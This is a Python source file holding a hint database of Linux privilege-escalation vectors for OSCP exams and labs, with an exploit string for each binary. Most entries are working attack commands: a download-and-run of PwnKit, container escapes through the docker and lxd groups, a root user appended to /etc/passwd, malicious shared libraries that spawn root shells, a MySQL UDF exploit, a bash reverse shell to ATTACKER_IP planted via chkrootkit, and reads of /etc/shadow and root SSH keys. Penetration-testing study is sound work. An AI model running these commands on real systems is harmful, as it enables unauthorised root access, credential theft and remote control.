"""
Custom Hints Database - Known vulnerable binaries and OSCP-common vectors
that are NOT in GTFOBins but frequently appear in exams/labs.
"""

# fmt: off
CUSTOM_HINTS = {
    "pkexec": {
        "hint": "PwnKit CVE-2021-4034 — universal Linux LPE (polkit < 0.120)",
        "exploit": "# Check version: pkexec --version\n# Exploit: https://github.com/ly4k/PwnKit\n# One-liner: curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit && chmod +x PwnKit && ./PwnKit",
        "priority": 1,
    },
    "sudo": {
        "hint": "Check sudo version for CVE-2021-3156 (Baron Samedit) — sudo < 1.9.5p2",
        "exploit": "# Check: sudo --version\n# CVE-2021-3156 (sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1):\n#   sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')\n# If segfault → vulnerable\n# Also check: sudo -l (misconfigurations)",
        "priority": 1,
    },
    "screen": {
        "hint": "GNU Screen 4.5.0 — local root exploit (ld.so.preload)",
        "exploit": "# screen -v → check if 4.5.0\n# Exploit: https://www.exploit-db.com/exploits/41154\nlibhax_c='#include <stdio.h>\\n#include <sys/types.h>\\n#include <unistd.h>\\n__attribute__ ((__constructor__)) void dropshell(void){\\nchown(\"/tmp/rootshell\", 0, 0);\\nchmod(\"/tmp/rootshell\", 04755);\\n}'\nrootshell_c='#include <stdio.h>\\nint main(void){\\nsetuid(0);setgid(0);seteuid(0);setegid(0);\\nsystem(\"/bin/bash\");\\n}'",
        "priority": 1,
    },
    "docker": {
        "hint": "If user is in docker group → instant root",
        "exploit": "# Check: id | grep docker\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# Or: docker run -v /:/host --rm -it alpine cat /host/etc/shadow",
        "priority": 1,
    },
    "lxc": {
        "hint": "If user is in lxd/lxc group → instant root",
        "exploit": "# On attacker: lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage\n# Or build: git clone https://github.com/saghul/lxd-alpine-builder; ./build-alpine\nlxc init myimage mycontainer -c security.privileged=true\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root\nlxc start mycontainer\nlxc exec mycontainer /bin/sh",
        "priority": 1,
    },
    "lxd": {
        "hint": "If user is in lxd group → instant root (same as lxc)",
        "exploit": "# Same as lxc group exploit\nlxc image import ./alpine.tar.gz --alias myimage\nlxc init myimage ignite -c security.privileged=true\nlxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true\nlxc start ignite\nlxc exec ignite /bin/sh",
        "priority": 1,
    },
    "snap": {
        "hint": "snapd < 2.37 → Dirty Sock CVE-2019-7304",
        "exploit": "# Check: snap version\n# Exploit: https://github.com/initstring/dirty_sock\npython3 dirty_sockv2.py",
        "priority": 1,
    },
    "passwd": {
        "hint": "If writable /etc/passwd → add root user",
        "exploit": "# Generate hash: openssl passwd -1 -salt hacker password123\n# Add line: hacker:$1$hacker$xyz:0:0:root:/root:/bin/bash\necho 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcCl/:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker  # password: password123",
        "priority": 1,
    },
    "nmap": {
        "hint": "nmap 2.02-5.21 has --interactive mode for shell escape",
        "exploit": "# Check: nmap --version\n# If 2.02-5.21:\nnmap --interactive\n!sh\n# Newer versions: use NSE script method",
        "priority": 1,
    },
    "ssh-keygen": {
        "hint": "ssh-keygen SUID — can load shared library",
        "exploit": "# Create malicious .so:\necho '#include <unistd.h>\\n__attribute__((constructor)) void x(){setuid(0);setgid(0);system(\"/bin/sh\");}' > /tmp/pe.c\ngcc -shared -fPIC -o /tmp/pe.so /tmp/pe.c\nssh-keygen -D /tmp/pe.so",
        "priority": 1,
    },
    "doas": {
        "hint": "doas is similar to sudo — check config file",
        "exploit": "# Check config:\ncat /etc/doas.conf\ncat /usr/local/etc/doas.conf\n# If permit nopass user as root cmd /bin/sh:\ndoas /bin/sh",
        "priority": 2,
    },
    "ndsudo": {
        "hint": "CVE-2024-32019 — ndsudo privilege escalation",
        "exploit": "# Exploit: https://github.com/AzureADTrent/CVE-2024-32019-POC\n# Compile on attacker, transfer to target",
        "priority": 1,
    },
    "polkit": {
        "hint": "pkexec/polkit — multiple CVEs for privilege escalation",
        "exploit": "# CVE-2021-4034 (PwnKit): pkexec version < 0.120\n# CVE-2021-3560 (polkit 0.113-0.118): \n# dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:\"\" int32:1 & sleep 0.008s; kill $!",
        "priority": 1,
    },
    "exim": {
        "hint": "Exim 4.84-3 / 4.87-4.91 — local privilege escalation",
        "exploit": "# Check: exim --version\n# CVE-2016-1531 (Exim 4.84-3):\nexim -bps -Mf /etc/shadow\n# https://www.exploit-db.com/exploits/39549",
        "priority": 1,
    },
    "chkrootkit": {
        "hint": "chkrootkit 0.49 — local root (if run by cron as root)",
        "exploit": "# CVE-2014-0476: chkrootkit < 0.50 runs /tmp/update as root\necho '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /tmp/update\nchmod +x /tmp/update\n# Wait for cron to execute chkrootkit",
        "priority": 2,
    },
    "mysql": {
        "hint": "MySQL running as root — UDF exploit",
        "exploit": "# Check: ps aux | grep mysql\n# If running as root with FILE privilege:\n# Use raptor_udf2.c or lib_mysqludf_sys\nUSE mysql;\nCREATE TABLE foo(line blob);\nINSERT INTO foo VALUES(load_file('/tmp/raptor_udf2.so'));\nSELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';\nCREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';\nSELECT do_system('chmod u+s /bin/bash');",
        "priority": 2,
    },
    "ntpdate": {
        "hint": "ntpdate SUID — can run arbitrary commands via step-tick",
        "exploit": "ntpdate -s /path/to/file",
        "priority": 3,
    },
    "wget": {
        "hint": "wget with SUID — overwrite system files",
        "exploit": "# Overwrite /etc/passwd or /etc/shadow:\n# On attacker: set up HTTP server with modified passwd file\nwget http://ATTACKER_IP/passwd -O /etc/passwd",
        "priority": 2,
    },
    "debugfs": {
        "hint": "debugfs SUID — read any file on ext filesystem",
        "exploit": "debugfs /dev/sda1\ncat /etc/shadow\ncat /root/.ssh/id_rsa",
        "priority": 2,
    },
    "dosbox": {
        "hint": "dosbox SUID — can mount filesystem and write",
        "exploit": "dosbox -c 'mount c /' -c 'type c:\\etc\\shadow'",
        "priority": 3,
    },
    "apache2": {
        "hint": "apache2 SUID — file read via -f flag (error leaks content)",
        "exploit": "apache2 -f /etc/shadow\n# Content appears in error message",
        "priority": 3,
    },
    "taskset": {
        "hint": "taskset SUID — can spawn privileged shell",
        "exploit": "taskset 1 /bin/sh -p",
        "priority": 1,
    },
    "aa-exec": {
        "hint": "aa-exec SUID — run command under AppArmor profile (unconfined = shell)",
        "exploit": "aa-exec /bin/sh -p",
        "priority": 1,
    },
    "gimp": {
        "hint": "gimp SUID — Script-Fu can execute commands",
        "exploit": "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
        "priority": 1,
    },
    "wine": {
        "hint": "wine with SUID — can potentially execute Windows binaries as root",
        "exploit": "# Create payload with msfvenom that spawns a Linux shell\n# Requires careful handling",
        "priority": 5,
    },
    "borg": {
        "hint": "borgbackup can read arbitrary files",
        "exploit": "borg init --encryption=none /tmp/borg\nborg create /tmp/borg::pwn /etc/shadow\nborg extract --stdout /tmp/borg::pwn etc/shadow",
        "priority": 3,
    },
}

# Capabilities-specific hints
CAPABILITIES_HINTS = {
    "cap_setuid": "Binary can change UID → call setuid(0) then spawn shell",
    "cap_setgid": "Binary can change GID → call setgid(0)",
    "cap_dac_override": "Binary can bypass file read/write/execute permission checks → read /etc/shadow",
    "cap_dac_read_search": "Binary can bypass file read permission and directory read/execute → read any file",
    "cap_net_raw": "Binary can use raw sockets → packet sniffing/injection",
    "cap_sys_admin": "Binary has sysadmin capabilities → mount filesystems, etc.",
    "cap_sys_ptrace": "Binary can trace processes → inject into root processes",
    "cap_net_bind_service": "Binary can bind privileged ports (<1024)",
    "cap_fowner": "Binary can bypass permission checks on operations that require UID match",
    "cap_chown": "Binary can change file ownership arbitrarily",
}
# fmt: on
